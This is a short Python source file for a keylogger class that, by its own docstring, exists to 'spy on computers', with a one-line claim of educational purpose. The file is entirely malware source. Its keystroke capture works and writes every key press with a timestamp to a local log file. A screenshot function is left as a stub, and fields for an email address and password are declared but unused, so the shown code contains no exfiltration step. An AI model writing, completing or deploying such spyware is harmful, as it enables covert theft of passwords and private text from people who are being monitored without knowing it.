from pynput.keyboard import Key, Listener
import logging
import time

class KeyLogger:
    """
    Class used to track keystrokes and spy on computers using screenshots
    <!This is solely for educational purposes!>
        
    KeyLogger used to track keystrokes on keyboards
    toemail: email being sent to by logger
    lemail: loggers email account
    pswd: loggers email password
    pswd: password
    stime: time of the current logging round
    """
    def __init__(self, log_dir="", email="default@gmail.com", pswd="drowssap"):
        self.toemail = email
        self.lemail = "default@gmail.com"
        self.pswd = pswd
        self.mem = []
        self.stime = time.time()
        logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.INFO, format='%(asctime)s: %(message)s')

    def __screenshot(self):
        """
        Takes screenshot of computer
        """
        # TODO takes a screenshot of the persons screen
        return None
        
    def __on_press(self, key):
        """
        Action taken on keyboard press
        """
        self.mem.append(str(key))
        if time.time() - self.stime >= 10.0 or key == Key.space or key == Key.enter:
            # log the data, update time and flush buffer
            logging.info("".join(self.mem))
            self.mem.clear() 
            self.stime = time.time()
            
    def run_keylogger(self):
        with Listener(on_press=self.__on_press) as listener:
            try:
                listener.join()
            except Exception:
                print("Threading error")
    
